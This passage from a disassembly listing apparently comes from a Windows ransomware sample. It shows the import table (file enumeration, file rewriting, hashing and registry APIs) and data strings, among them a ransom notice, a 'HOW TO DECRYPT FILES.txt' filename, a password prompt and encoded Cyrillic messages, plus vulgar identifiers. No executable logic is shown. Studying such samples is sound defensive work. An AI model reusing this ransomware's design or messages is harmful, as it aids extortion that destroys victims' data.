.rdata:00403150                 dd 0                    ; Time stamp
.rdata:00403154                 dd 0                    ; Forwarder Chain
.rdata:00403158                 dd rva aAdvapi32Dll     ; DLL Name
.rdata:0040315C                 dd rva __imp_RegCreateKeyExA ; Import Address Table
.rdata:00403160 __IMPORT_DESCRIPTOR_comctl32 dd 0       ; Import Name Table
.rdata:00403164                 dd 0                    ; Time stamp
.rdata:00403168                 dd 0                    ; Forwarder Chain
.rdata:0040316C                 dd rva aComctl32Dll     ; DLL Name
.rdata:00403170                 dd rva __imp_InitCommonControls ; Import Address Table
.rdata:00403174 __IMPORT_DESCRIPTOR_gdi32 dd 0          ; Import Name Table
.rdata:00403178                 dd 0                    ; Time stamp
.rdata:0040317C                 dd 0                    ; Forwarder Chain
.rdata:00403180                 dd rva aGdi32Dll        ; DLL Name
.rdata:00403184                 dd rva __imp_CreateFontIndirectA ; Import Address Table
.rdata:00403188 __IMPORT_DESCRIPTOR_shell32 dd 0        ; Import Name Table
.rdata:0040318C                 dd 0                    ; Time stamp
.rdata:00403190                 dd 0                    ; Forwarder Chain
.rdata:00403194                 dd rva aShell32Dll      ; DLL Name
.rdata:00403198                 dd rva __imp_ShellExecuteA ; Import Address Table
.rdata:0040319C __IMPORT_DESCRIPTOR_shlwapi dd 0        ; Import Name Table
.rdata:004031A0                 dd 0                    ; Time stamp
.rdata:004031A4                 dd 0                    ; Forwarder Chain
.rdata:004031A8                 dd rva aShlwapiDll      ; DLL Name
.rdata:004031AC                 dd rva __imp_PathFindFileNameA ; Import Address Table
.rdata:004031B0 __IMPORT_DESCRIPTOR_user32 dd 0         ; Import Name Table
.rdata:004031B4                 dd 0                    ; Time stamp
.rdata:004031B8                 dd 0                    ; Forwarder Chain
.rdata:004031BC                 dd rva aUser32Dll       ; DLL Name
.rdata:004031C0                 dd rva __imp_RegisterClassExA ; Import Address Table
.rdata:004031C4                 db    0
.rdata:004031C5                 db    0
.rdata:004031C6                 db    0
.rdata:004031C7                 db    0
.rdata:004031C8                 db    0
.rdata:004031C9                 db    0
.rdata:004031CA                 db    0
.rdata:004031CB                 db    0
.rdata:004031CC                 db    0
.rdata:004031CD                 db    0
.rdata:004031CE                 db    0
.rdata:004031CF                 db    0
.rdata:004031D0                 db    0
.rdata:004031D1                 db    0
.rdata:004031D2                 db    0
.rdata:004031D3                 db    0
.rdata:004031D4                 db    0
.rdata:004031D5                 db    0
.rdata:004031D6                 db    0
.rdata:004031D7                 db    0
.rdata:004031D8                 db    0
.rdata:004031D9                 db    0
.rdata:004031DA                 db    0
.rdata:004031DB                 db    0
.rdata:004031DC                 db    0
.rdata:004031DD                 db    0
.rdata:004031DE                 db    0
.rdata:004031DF                 db    0
.rdata:004031E0                 db    0
.rdata:004031E1                 db    0
.rdata:004031E2                 db    0
.rdata:004031E3                 db    0
.rdata:004031E4                 db    0
.rdata:004031E5                 db    0
.rdata:004031E6                 db    0
.rdata:004031E7                 db    0
.rdata:004031E8                 db    0
.rdata:004031E9                 db    0
.rdata:004031EA                 db    0
.rdata:004031EB                 db    0
.rdata:004031EC                 db    0
.rdata:004031ED                 db    0
.rdata:004031EE                 db    0
.rdata:004031EF                 db    0
.rdata:004031F0                 db    0
.rdata:004031F1                 db    0
.rdata:004031F2                 db    0
.rdata:004031F3                 db    0
.rdata:004031F4                 db    0
.rdata:004031F5                 db    0
.rdata:004031F6                 db    0
.rdata:004031F7                 db    0
.rdata:004031F8                 db    0
.rdata:004031F9                 db    0
.rdata:004031FA                 db    0
.rdata:004031FB                 db    0
.rdata:004031FC                 db    0
.rdata:004031FD                 db    0
.rdata:004031FE                 db    0
.rdata:004031FF                 db    0
.rdata:00403200                 db    0
.rdata:00403201                 db    0
.rdata:00403202                 db    0
.rdata:00403203                 db    0
.rdata:00403204                 db    0
.rdata:00403205                 db    0
.rdata:00403206                 db    0
.rdata:00403207                 db    0
.rdata:00403208                 db    0
.rdata:00403209                 db    0
.rdata:0040320A                 db    0
.rdata:0040320B                 db    0
.rdata:0040320C                 db    0
.rdata:0040320D                 db    0
.rdata:0040320E                 db    0
.rdata:0040320F                 db    0
.rdata:00403210                 db    0
.rdata:00403211                 db    0
.rdata:00403212                 db    0
.rdata:00403213                 db    0
.rdata:00403214                 db    0
.rdata:00403215                 db    0
.rdata:00403216                 db    0
.rdata:00403217                 db    0
.rdata:00403218                 db    0
.rdata:00403219                 db    0
.rdata:0040321A                 db    0
.rdata:0040321B                 db    0
.rdata:0040321C                 db    0
.rdata:0040321D                 db    0
.rdata:0040321E                 db    0
.rdata:0040321F                 db    0
.rdata:00403220                 db    0
.rdata:00403221                 db    0
.rdata:00403222                 db    0
.rdata:00403223                 db    0
.rdata:00403224                 db    0
.rdata:00403225                 db    0
.rdata:00403226                 db    0
.rdata:00403227                 db    0
.rdata:00403228                 db    0
.rdata:00403229                 db    0
.rdata:0040322A                 db    0
.rdata:0040322B                 db    0
.rdata:0040322C                 db    0
.rdata:0040322D                 db    0
.rdata:0040322E                 db    0
.rdata:0040322F                 db    0
.rdata:00403230                 db    0
.rdata:00403231                 db    0
.rdata:00403232                 db    0
.rdata:00403233                 db    0
.rdata:00403234                 db    0
.rdata:00403235                 db    0
.rdata:00403236                 db    0
.rdata:00403237                 db    0
.rdata:00403238                 db    0
.rdata:00403239                 db    0
.rdata:0040323A                 db    0
.rdata:0040323B                 db    0
.rdata:0040323C                 db    0
.rdata:0040323D                 db    0
.rdata:0040323E                 db    0
.rdata:0040323F                 db    0
.rdata:00403240                 db    0
.rdata:00403241                 db    0
.rdata:00403242                 db    0
.rdata:00403243                 db    0
.rdata:00403244                 db    0
.rdata:00403245                 db    0
.rdata:00403246                 db    0
.rdata:00403247                 db    0
.rdata:00403248                 db    0
.rdata:00403249                 db    0
.rdata:0040324A                 db    0
.rdata:0040324B                 db    0
.rdata:0040324C                 db    0
.rdata:0040324D                 db    0
.rdata:0040324E                 db    0
.rdata:0040324F                 db    0
.rdata:00403250                 db    0
.rdata:00403251                 db    0
.rdata:00403252                 db    0
.rdata:00403253                 db    0
.rdata:00403254                 db    0
.rdata:00403255                 db    0
.rdata:00403256                 db    0
.rdata:00403257                 db    0
.rdata:00403258                 db    0
.rdata:00403259                 db    0
.rdata:0040325A                 db    0
.rdata:0040325B                 db    0
.rdata:0040325C                 db    0
.rdata:0040325D                 db    0
.rdata:0040325E                 db    0
.rdata:0040325F                 db    0
.rdata:00403260                 db    0
.rdata:00403261                 db    0
.rdata:00403262                 db    0
.rdata:00403263                 db    0
.rdata:00403264                 db    0
.rdata:00403265                 db    0
.rdata:00403266                 db    0
.rdata:00403267                 db    0
.rdata:00403268                 db    0
.rdata:00403269                 db    0
.rdata:0040326A                 db    0
.rdata:0040326B                 db    0
.rdata:0040326C                 db    0
.rdata:0040326D                 db    0
.rdata:0040326E                 db    0
.rdata:0040326F                 db    0
.rdata:00403270                 db    0
.rdata:00403271                 db    0
.rdata:00403272                 db    0
.rdata:00403273                 db    0
.rdata:00403274                 db    0
.rdata:00403275                 db    0
.rdata:00403276                 db    0
.rdata:00403277                 db    0
.rdata:00403278                 db    0
.rdata:00403279                 db    0
.rdata:0040327A                 db    0
.rdata:0040327B                 db    0
.rdata:0040327C                 db    0
.rdata:0040327D                 db    0
.rdata:0040327E                 db    0
.rdata:0040327F                 db    0
.rdata:00403280                 db    0
.rdata:00403281                 db    0
.rdata:00403282                 db    0
.rdata:00403283                 db    0
.rdata:00403284                 db    0
.rdata:00403285                 db    0
.rdata:00403286                 db    0
.rdata:00403287                 db    0
.rdata:00403288                 db    0
.rdata:00403289                 db    0
.rdata:0040328A                 db    0
.rdata:0040328B                 db    0
.rdata:0040328C                 db    0
.rdata:0040328D                 db    0
.rdata:0040328E                 db    0
.rdata:0040328F                 db    0
.rdata:00403290                 db    0
.rdata:00403291                 db    0
.rdata:00403292                 db    0
.rdata:00403293                 db    0
.rdata:00403294                 db    0
.rdata:00403295                 db    0
.rdata:00403296                 db    0
.rdata:00403297                 db    0
.rdata:00403298                 db    0
.rdata:00403299                 db    0
.rdata:0040329A                 db    0
.rdata:0040329B                 db    0
.rdata:0040329C                 db    0
.rdata:0040329D                 db    0
.rdata:0040329E                 db    0
.rdata:0040329F                 db    0
.rdata:004032A0                 db    0
.rdata:004032A1                 db    0
.rdata:004032A2                 db    0
.rdata:004032A3                 db    0
.rdata:004032A4                 db    0
.rdata:004032A5                 db    0
.rdata:004032A6                 db    0
.rdata:004032A7                 db    0
.rdata:004032A8                 db    0
.rdata:004032A9                 db    0
.rdata:004032AA                 db    0
.rdata:004032AB                 db    0
.rdata:004032AC                 db    0
.rdata:004032AD                 db    0
.rdata:004032AE                 db    0
.rdata:004032AF                 db    0
.rdata:004032B0                 db    0
.rdata:004032B1                 db    0
.rdata:004032B2                 db    0
.rdata:004032B3                 db    0
.rdata:004032B4                 db    0
.rdata:004032B5                 db    0
.rdata:004032B6                 db    0
.rdata:004032B7                 db    0
.rdata:004032B8                 db    0
.rdata:004032B9                 db    0
.rdata:004032BA                 db    0
.rdata:004032BB                 db    0
.rdata:004032BC                 db    0
.rdata:004032BD                 db    0
.rdata:004032BE                 db    0
.rdata:004032BF                 db    0
.rdata:004032C0                 db    0
.rdata:004032C1                 db    0
.rdata:004032C2                 db    0
.rdata:004032C3                 db    0
.rdata:004032C4                 db    0
.rdata:004032C5                 db    0
.rdata:004032C6                 db    0
.rdata:004032C7                 db    0
.rdata:004032C8                 db    0
.rdata:004032C9                 db    0
.rdata:004032CA                 db    0
.rdata:004032CB                 db    0
.rdata:004032CC                 db    0
.rdata:004032CD                 db    0
.rdata:004032CE                 db    0
.rdata:004032CF                 db    0
.rdata:004032D0                 db    0
.rdata:004032D1                 db    0
.rdata:004032D2                 db    0
.rdata:004032D3                 db    0
.rdata:004032D4                 db    0
.rdata:004032D5                 db    0
.rdata:004032D6                 db    0
.rdata:004032D7                 db    0
.rdata:004032D8                 db    0
.rdata:004032D9                 db    0
.rdata:004032DA                 db    0
.rdata:004032DB                 db    0
.rdata:004032DC                 db    0
.rdata:004032DD                 db    0
.rdata:004032DE                 db    0
.rdata:004032DF                 db    0
.rdata:004032E0                 db    0
.rdata:004032E1                 db    0
.rdata:004032E2                 db    0
.rdata:004032E3                 db    0
.rdata:004032E4                 db    0
.rdata:004032E5                 db    0
.rdata:004032E6                 db    0
.rdata:004032E7                 db    0
.rdata:004032E8                 db    0
.rdata:004032E9                 db    0
.rdata:004032EA                 db    0
.rdata:004032EB                 db    0
.rdata:004032EC                 db    0
.rdata:004032ED                 db    0
.rdata:004032EE                 db    0
.rdata:004032EF                 db    0
.rdata:004032F0                 db    0
.rdata:004032F1                 db    0
.rdata:004032F2                 db    0
.rdata:004032F3                 db    0
.rdata:004032F4                 db    0
.rdata:004032F5                 db    0
.rdata:004032F6                 db    0
.rdata:004032F7                 db    0
.rdata:004032F8                 db    0
.rdata:004032F9                 db    0
.rdata:004032FA                 db    0
.rdata:004032FB                 db    0
.rdata:004032FC                 db    0
.rdata:004032FD                 db    0
.rdata:004032FE                 db    0
.rdata:004032FF                 db    0
.rdata:00403300                 db    0
.rdata:00403301                 db    0
.rdata:00403302                 db    0
.rdata:00403303                 db    0
.rdata:00403304                 db    0
.rdata:00403305                 db    0
.rdata:00403306                 db    0
.rdata:00403307                 db    0
.rdata:00403308                 db    0
.rdata:00403309                 db    0
.rdata:0040330A                 db    0
.rdata:0040330B                 db    0
.rdata:0040330C                 db    0
.rdata:0040330D                 db    0
.rdata:0040330E                 db    0
.rdata:0040330F                 db    0
.rdata:00403310 aKernel32Dll    db 'KERNEL32.DLL',0     ; DATA XREF: .rdata:00403144↑o
.rdata:0040331D aAdvapi32Dll    db 'advapi32.dll',0     ; DATA XREF: .rdata:00403158↑o
.rdata:0040332A aComctl32Dll    db 'comctl32.dll',0     ; DATA XREF: .rdata:0040316C↑o
.rdata:00403337 aGdi32Dll       db 'gdi32.dll',0        ; DATA XREF: .rdata:00403180↑o
.rdata:00403341 aShell32Dll     db 'shell32.dll',0      ; DATA XREF: .rdata:00403194↑o
.rdata:0040334D aShlwapiDll     db 'shlwapi.dll',0      ; DATA XREF: .rdata:004031A8↑o
.rdata:00403359 aUser32Dll      db 'user32.dll',0       ; DATA XREF: .rdata:004031BC↑o
.rdata:00403364                 dw 0
.rdata:00403366                 db 'lstrlenA'
.rdata:0040336E                 dw 0
.rdata:00403370                 db 'CloseHandle',0
.rdata:0040337C                 dw 0
.rdata:0040337E                 db 'CopyFileA',0
.rdata:00403388                 dw 0
.rdata:0040338A                 db 'CreateFileA',0
.rdata:00403396                 dw 0
.rdata:00403398                 db 'ExitProcess',0
.rdata:004033A4                 dw 0
.rdata:004033A6                 db 'FindClose',0
.rdata:004033B0                 dw 0
.rdata:004033B2                 db 'FindFirstFileA'
.rdata:004033C0                 dw 0
.rdata:004033C2                 db 'FindNextFileA',0
.rdata:004033D0                 dw 0
.rdata:004033D2                 db 'FindResourceA',0
.rdata:004033E0                 dw 0
.rdata:004033E2                 db 'FreeResource'
.rdata:004033EE                 dw 0
.rdata:004033F0                 db 'GetCommandLineA',0
.rdata:00403400                 dw 0
.rdata:00403402                 db 'GetEnvironmentVariableA',0
.rdata:0040341A                 dw 0
.rdata:0040341C                 db 'GetFileAttributesA'
.rdata:0040342E                 dw 0
.rdata:00403430                 db 'GetFileSize',0
.rdata:0040343C                 dw 0
.rdata:0040343E                 db 'GetFileTime',0
.rdata:0040344A                 dw 0
.rdata:0040344C                 db 'GetLogicalDrives'
.rdata:0040345C                 dw 0
.rdata:0040345E                 db 'GetModuleFileNameA'
.rdata:00403470                 dw 0
.rdata:00403472                 db 'GetModuleHandleA'
.rdata:00403482                 dw 0
.rdata:00403484                 db 'GetProcessHeap'
.rdata:00403492                 dw 0
.rdata:00403494                 db 'GetTempPathA'
.rdata:004034A0                 dw 0
.rdata:004034A2                 db 'GetWindowsDirectoryA'
.rdata:004034B6                 dw 0
.rdata:004034B8                 db 'GlobalFree'
.rdata:004034C2                 dw 0
.rdata:004034C4                 db 'HeapAlloc',0
.rdata:004034CE                 dw 0
.rdata:004034D0                 db 'LoadResource'
.rdata:004034DC                 dw 0
.rdata:004034DE                 db 'LockResource'
.rdata:004034EA                 dw 0
.rdata:004034EC                 db 'MoveFileA',0
.rdata:004034F6                 dw 0
.rdata:004034F8                 db 'ReadFile'
.rdata:00403500                 dw 0
.rdata:00403502                 db 'RtlMoveMemory',0
.rdata:00403510                 dw 0
.rdata:00403512                 db 'SetErrorMode'
.rdata:0040351E                 dw 0
.rdata:00403520                 db 'SetFilePointer'
.rdata:0040352E                 dw 0
.rdata:00403530                 db 'SetFileTime',0
.rdata:0040353C                 dw 0
.rdata:0040353E                 db 'SizeofResource'
.rdata:0040354C                 dw 0
.rdata:0040354E                 db 'WriteFile',0
.rdata:00403558                 dw 0
.rdata:0040355A                 db 'lstrcatA'
.rdata:00403562                 dw 0
.rdata:00403564                 db 'lstrcmpA'
.rdata:0040356C                 dw 0
.rdata:0040356E                 db 'lstrcmpiA',0
.rdata:00403578                 dw 0
.rdata:0040357A                 db 'lstrcpyA'
.rdata:00403582                 dw 0
.rdata:00403584                 db 'RegCreateKeyExA',0
.rdata:00403594                 dw 0
.rdata:00403596                 db 'CryptCreateHash',0
.rdata:004035A6                 dw 0
.rdata:004035A8                 db 'CryptDestroyHash'
.rdata:004035B8                 dw 0
.rdata:004035BA                 db 'CryptGetHashParam',0
.rdata:004035CC                 dw 0
.rdata:004035CE                 db 'RegSetValueExA'
.rdata:004035DC                 dw 0
.rdata:004035DE                 db 'RegDeleteKeyA',0
.rdata:004035EC                 dw 0
.rdata:004035EE                 db 'CryptAcquireContextA'
.rdata:00403602                 dw 0
.rdata:00403604                 db 'RegCloseKey',0
.rdata:00403610                 dw 0
.rdata:00403612                 db 'CryptReleaseContext',0
.rdata:00403626                 dw 0
.rdata:00403628                 db 'CryptHashData',0
.rdata:00403636                 dw 0
.rdata:00403638                 db 'InitCommonControls'
.rdata:0040364A                 dw 0
.rdata:0040364C                 db 'CreateFontIndirectA',0
.rdata:00403660                 dw 0
.rdata:00403662                 db 'ShellExecuteA',0
.rdata:00403670                 dw 0
.rdata:00403672                 db 'SHGetSpecialFolderPathA',0
.rdata:0040368A                 dw 0
.rdata:0040368C                 db 'PathFindFileNameA',0
.rdata:0040369E                 dw 0
.rdata:004036A0                 db 'PathFindExtensionA'
.rdata:004036B2                 dw 0
.rdata:004036B4                 db 'PathAddBackslashA',0
.rdata:004036C6                 dw 0
.rdata:004036C8                 db 'PathMatchSpecA'
.rdata:004036D6                 dw 0
.rdata:004036D8                 db 'RegisterClassExA'
.rdata:004036E8                 dw 0
.rdata:004036EA                 db 'PeekMessageA'
.rdata:004036F6                 dw 0
.rdata:004036F8                 db 'SendMessageA'
.rdata:00403704                 dw 0
.rdata:00403706                 db 'LoadCursorA',0
.rdata:00403712                 dw 0
.rdata:00403714                 db 'GetSystemMetrics'
.rdata:00403724                 dw 0
.rdata:00403726                 db 'GetMessageA',0
.rdata:00403732                 dw 0
.rdata:00403734                 db 'GetDlgItemTextA',0
.rdata:00403744                 dw 0
.rdata:00403746                 db 'EndPaint'
.rdata:0040374E                 dw 0
.rdata:00403750                 db 'SystemParametersInfoA',0
.rdata:00403766                 dw 0
.rdata:00403768                 db 'TranslateMessage'
.rdata:00403778                 dw 0
.rdata:0040377A                 db 'UpdateWindow'
.rdata:00403786                 dw 0
.rdata:00403788                 db 'MessageBoxA',0
.rdata:00403794                 dw 0
.rdata:00403796                 db 'DispatchMessageA'
.rdata:004037A6                 dw 0
.rdata:004037A8                 db 'DefWindowProcA'
.rdata:004037B6                 dw 0
.rdata:004037B8                 db 'CreateWindowExA',0
.rdata:004037C8                 dw 0
.rdata:004037CA                 db 'BeginPaint',0
.rdata:004037D5                 align 1000h
.rdata:004037D5 _rdata          ends
.rdata:004037D5
.data:00404000 ; Section 3. (virtual address 00004000)
.data:00404000 ; Virtual size                  : 000038BB (  14523.)
.data:00404000 ; Section size in file          : 00000600 (   1536.)
.data:00404000 ; Offset to raw data for section: 00002600
.data:00404000 ; Flags C0000040: Data Readable Writable
.data:00404000 ; Alignment     : default
.data:00404000 ; ===========================================================================
.data:00404000
.data:00404000 ; Segment type: Pure data
.data:00404000 ; Segment permissions: Read/Write
.data:00404000 _data           segment para public 'DATA' use32
.data:00404000                 assume cs:_data
.data:00404000                 ;org 404000h
.data:00404000 ; CHAR ClassName[]
.data:00404000 ClassName       db '0p3nSOurc3 X0r157, motherfucker!',0
.data:00404000                                         ; DATA XREF: start-7F5↑o
.data:00404000                                         ; start:loc_401A6B↑o
.data:00404021 ; CHAR Name[]
.data:00404021 Name            db 'pussylicker',0      ; DATA XREF: sub_4010FC+56↑o
.data:0040402D ; CHAR aBmp[]
.data:0040402D aBmp            db '.bmp',0             ; DATA XREF: sub_4010FC+27↑o
.data:00404032 ; CHAR asc_404032[]
.data:00404032 asc_404032      db '.',0                ; DATA XREF: sub_40124F+32↑o
.data:00404032                                         ; sub_4013A8+3B↑o ...
.data:00404034 ; CHAR asc_404034[]
.data:00404034 asc_404034      db '..',0               ; DATA XREF: sub_4013A8+54↑o
.data:00404037 aOpen           db 'open',0
.data:0040403C ; CHAR aExe[]
.data:0040403C aExe            db '.exe',0             ; DATA XREF: start+74↑o
.data:00404041 ; CHAR asc_404041[]
.data:00404041 asc_404041      db '*',0                ; DATA XREF: sub_40124F:loc_401272↑o
.data:00404043 ; CHAR String2
.data:00404043 String2         db 0CAh                 ; DATA XREF: sub_40103A+26↑o
.data:00404043                                         ; sub_4013A8+D1↑o
.data:00404044                 db 0C0h
.data:00404045                 db 0CAh
.data:00404046                 db  20h
.data:00404047                 db 0D0h
.data:00404048                 db 0C0h
.data:00404049                 db 0D1h
.data:0040404A                 db 0D8h
.data:0040404B                 db 0C8h
.data:0040404C                 db 0D4h
.data:0040404D                 db 0D0h
.data:0040404E                 db 0CEh
.data:0040404F                 db 0C2h
.data:00404050                 db 0C0h
.data:00404051                 db 0D2h
.data:00404052                 db 0DCh
.data:00404053                 db  20h
.data:00404054                 db 0D4h
.data:00404055                 db 0C0h
.data:00404056                 db 0C9h
.data:00404057                 db 0CBh
.data:00404058                 db 0DBh
.data:00404059                 db  2Eh ; .
.data:0040405A                 db  74h ; t
.data:0040405B                 db  78h ; x
.data:0040405C                 db  74h ; t
.data:0040405D                 db    0
.data:0040405E ; CHAR aHowToDecryptFi[]
.data:0040405E aHowToDecryptFi db 'HOW TO DECRYPT FILES.txt',0
.data:0040405E                                         ; DATA XREF: sub_40103A:loc_401071↑o
.data:0040405E                                         ; sub_4013A8+EA↑o
.data:00404077 ; CHAR byte_404077
.data:00404077 byte_404077     db 0D4h                 ; DATA XREF: sub_40124F+CC↑o
.data:00404077                                         ; sub_40124F+E1↑o
.data:00404078                 db 0E0h
.data:00404079                 db 0E9h
.data:0040407A                 db 0EBh
.data:0040407B                 db 0FBh
.data:0040407C                 db  20h
.data:0040407D                 db 0F3h
.data:0040407E                 db 0F1h
.data:0040407F                 db 0EFh
.data:00404080                 db 0E5h
.data:00404081                 db 0F8h
.data:00404082                 db 0EDh
.data:00404083                 db 0EEh
.data:00404084                 db  20h
.data:00404085                 db 0F0h
.data:00404086                 db 0E0h
.data:00404087                 db 0F1h
.data:00404088                 db 0F8h
.data:00404089                 db 0E8h
.data:0040408A                 db 0F4h
.data:0040408B                 db 0F0h
.data:0040408C                 db 0EEh
.data:0040408D                 db 0E2h
.data:0040408E                 db 0E0h
.data:0040408F                 db 0EDh
.data:00404090                 db 0FBh
.data:00404091                 db  21h ; !
.data:00404092                 db    0
.data:00404093                 db  46h ; F
.data:00404094                 db  69h ; i
.data:00404095                 db  6Ch ; l
.data:00404096                 db  65h ; e
.data:00404097                 db  73h ; s
.data:00404098                 db  20h
.data:00404099                 db  68h ; h
.data:0040409A                 db  61h ; a
.data:0040409B                 db  76h ; v
.data:0040409C                 db  65h ; e
.data:0040409D                 db  20h
.data:0040409E                 db  62h ; b
.data:0040409F                 db  65h ; e
.data:004040A0                 db  65h ; e
.data:004040A1                 db  6Eh ; n
.data:004040A2                 db  20h
.data:004040A3                 db  64h ; d
.data:004040A4                 db  65h ; e
.data:004040A5                 db  63h ; c
.data:004040A6                 db  72h ; r
.data:004040A7                 db  79h ; y
.data:004040A8                 db  70h ; p
.data:004040A9                 db  74h ; t
.data:004040AA                 db  65h ; e
.data:004040AB                 db  64h ; d
.data:004040AC                 db  20h
.data:004040AD                 db  73h ; s
.data:004040AE                 db  75h ; u
.data:004040AF                 db  63h ; c
.data:004040B0                 db  63h ; c
.data:004040B1                 db  65h ; e
.data:004040B2                 db  73h ; s
.data:004040B3                 db  73h ; s
.data:004040B4                 db  66h ; f
.data:004040B5                 db  75h ; u
.data:004040B6                 db  6Ch ; l
.data:004040B7                 db  6Ch ; l
.data:004040B8                 db  79h ; y
.data:004040B9                 db  21h ; !
.data:004040BA                 db    0
.data:004040BB ; CHAR byte_4040BB
.data:004040BB byte_4040BB     db 0CEh                 ; DATA XREF: sub_401AB9+164↑o
.data:004040BC                 db 0F8h
.data:004040BD                 db 0E8h
.data:004040BE                 db 0E1h
.data:004040BF                 db 0EAh
.data:004040C0                 db 0E0h
.data:004040C1                 db  21h ; !
.data:004040C2                 db    0
.data:004040C3 ; CHAR aError[]
.data:004040C3 aError          db 'Error!',0           ; DATA XREF: sub_401AB9+17A↑o
.data:004040CA ; CHAR byte_4040CA
.data:004040CA byte_4040CA     db 0CFh                 ; DATA XREF: sub_401AB9+169↑o
.data:004040CB                 db 0E0h
.data:004040CC                 db 0F0h
.data:004040CD                 db 0EEh
.data:004040CE                 db 0EBh
.data:004040CF                 db 0FCh
.data:004040D0                 db  20h
.data:004040D1                 db 0E2h
.data:004040D2                 db 0E2h
.data:004040D3                 db 0E5h
.data:004040D4                 db 0E4h
.data:004040D5                 db 0E5h
.data:004040D6                 db 0EDh
.data:004040D7                 db  20h
.data:004040D8                 db 0EDh
.data:004040D9                 db 0E5h
.data:004040DA                 db 0E2h
.data:004040DB                 db 0E5h
.data:004040DC                 db 0F0h
.data:004040DD                 db 0EDh
.data:004040DE                 db 0EEh
.data:004040DF                 db  21h ; !
.data:004040E0                 db    0
.data:004040E1 ; CHAR aPasswordIsInco[]
.data:004040E1 aPasswordIsInco db 'Password is incorrect!',0
.data:004040E1                                         ; DATA XREF: sub_401AB9+17F↑o
.data:004040F8 ; CHAR byte_4040F8
.data:004040F8 byte_4040F8     db 0C2h                 ; DATA XREF: sub_401AB9+41↑o
.data:004040F9                 db 0EDh
.data:004040FA                 db 0E8h
.data:004040FB                 db 0ECh
.data:004040FC                 db 0E0h
.data:004040FD                 db 0EDh
.data:004040FE                 db 0E8h
.data:004040FF                 db 0E5h
.data:00404100                 db  21h ; !
.data:00404101                 db  20h
.data:00404102                 db 0C2h
.data:00404103                 db 0E0h
.data:00404104                 db 0F8h
.data:00404105                 db 0E8h
.data:00404106                 db  20h
.data:00404107                 db 0F4h
.data:00404108                 db 0E0h
.data:00404109                 db 0E9h
.data:0040410A                 db 0EBh
.data:0040410B                 db 0FBh
.data:0040410C                 db  20h
.data:0040410D                 db 0E7h
.data:0040410E                 db 0E0h
.data:0040410F                 db 0F8h
.data:00404110                 db 0E8h
.data:00404111                 db 0F4h
.data:00404112                 db 0F0h
.data:00404113                 db 0EEh
.data:00404114                 db 0E2h
.data:00404115                 db 0E0h
.data:00404116                 db 0EDh
.data:00404117                 db 0FBh
.data:00404118                 db  21h ; !
.data:00404119                 db  0Dh
.data:0040411A                 db  0Ah
.data:0040411B                 db 0C4h
.data:0040411C                 db 0EBh
.data:0040411D                 db 0FFh
.data:0040411E                 db  20h
.data:0040411F                 db 0F0h
.data:00404120                 db 0E0h
.data:00404121                 db 0F1h
.data:00404122                 db 0F8h
.data:00404123                 db 0E8h
.data:00404124                 db 0F4h
.data:00404125                 db 0F0h
.data:00404126                 db 0EEh
.data:00404127                 db 0E2h
.data:00404128                 db 0EAh
.data:00404129                 db 0E8h
.data:0040412A                 db  20h
.data:0040412B                 db 0F2h
.data:0040412C                 db 0F0h
.data:0040412D                 db 0E5h
.data:0040412E                 db 0E1h
.data:0040412F                 db 0F3h
.data:00404130                 db 0E5h
.data:00404131                 db 0F2h
.data:00404132                 db 0F1h
.data:00404133                 db 0FFh
.data:00404134                 db  20h
.data:00404135                 db 0E2h
.data:00404136                 db 0E2h
.data:00404137                 db 0E5h
.data:00404138                 db 0F1h
.data:00404139                 db 0F2h
.data:0040413A                 db 0E8h
.data:0040413B                 db  20h
.data:0040413C                 db 0EFh
.data:0040413D                 db 0F0h
.data:0040413E                 db 0E0h
.data:0040413F                 db 0E2h
.data:00404140                 db 0E8h
.data:00404141                 db 0EBh
.data:00404142                 db 0FCh
.data:00404143                 db 0EDh
.data:00404144                 db 0FBh
.data:00404145                 db 0E9h
.data:00404146                 db  20h
.data:00404147                 db 0EFh
.data:00404148                 db 0E0h
.data:00404149                 db 0F0h
.data:0040414A                 db 0EEh
.data:0040414B                 db 0EBh
.data:0040414C                 db 0FCh
.data:0040414D                 db  21h ; !
.data:0040414E                 db    0
.data:0040414F ; CHAR aAttentionAllYo[]
.data:0040414F aAttentionAllYo db 'Attention! All your files were encrypted!',0Dh,0Ah
.data:0040414F                                         ; DATA XREF: sub_401AB9+5A↑o
.data:0040417A                 db 'To decrypt files, please enter correct password!',0
.data:004041AB ; CHAR byte_4041AB
.data:004041AB byte_4041AB     db 0C2h                 ; DATA XREF: sub_40124F+104↑o
.data:004041AC                 db 0FBh
.data:004041AD                 db  20h
.data:004041AE                 db 0E8h
.data:004041AF                 db 0F1h
.data:004041B0                 db 0F7h
.data:004041B1                 db 0E5h
.data:004041B2                 db 0F0h
.data:004041B3                 db 0EFh
.data:004041B4                 db 0E0h
.data:004041B5                 db 0EBh
.data:004041B6                 db 0E8h
.data:004041B7                 db  20h
.data:004041B8                 db 0EBh
.data:004041B9                 db 0E8h
.data:004041BA                 db 0ECh
.data:004041BB                 db 0E8h
.data:004041BC                 db 0F2h
.data:004041BD                 db  20h
.data:004041BE                 db 0EFh
.data:004041BF                 db 0EEh
.data:004041C0                 db 0EFh
.data:004041C1                 db 0FBh
.data:004041C2                 db 0F2h
.data:004041C3                 db 0EEh
.data:004041C4                 db 0EAh
.data:004041C5                 db  20h
.data:004041C6                 db  2Dh ; -
.data:004041C7                 db  20h
.data:004041C8                 db 0C2h
.data:004041C9                 db 0E0h
.data:004041CA                 db 0F8h
.data:004041CB                 db 0E8h
.data:004041CC                 db  20h
.data:004041CD                 db 0E4h
.data:004041CE                 db 0E0h
.data:004041CF                 db 0EDh
.data:004041D0                 db 0EDh
.data:004041D1                 db 0FBh
.data:004041D2                 db 0E5h
.data:004041D3                 db  20h
.data:004041D4                 db 0E1h
.data:004041D5                 db 0E5h
.data:004041D6                 db 0E7h
.data:004041D7                 db 0E2h
.data:004041D8                 db 0EEh
.data:004041D9                 db 0E7h
.data:004041DA                 db 0E2h
.data:004041DB                 db 0F0h
.data:004041DC                 db 0E0h
.data:004041DD                 db 0F2h
.data:004041DE                 db 0EDh
.data:004041DF                 db 0EEh
.data:004041E0                 db  20h
.data:004041E1                 db 0E8h
.data:004041E2                 db 0F1h
.data:004041E3                 db 0EFh
.data:004041E4                 db 0EEh
.data:004041E5                 db 0F0h
.data:004041E6                 db 0F7h
.data:004041E7                 db 0E5h
.data:004041E8                 db 0EDh
.data:004041E9                 db 0FBh
.data:004041EA                 db  2Eh ; .
.data:004041EB                 db    0
.data:004041EC ; CHAR aYouHaveReached[]
.data:004041EC aYouHaveReached db 'You have reached a limit of attempts - your data is irrevocably b'
.data:004041EC                                         ; DATA XREF: sub_40124F+119↑o
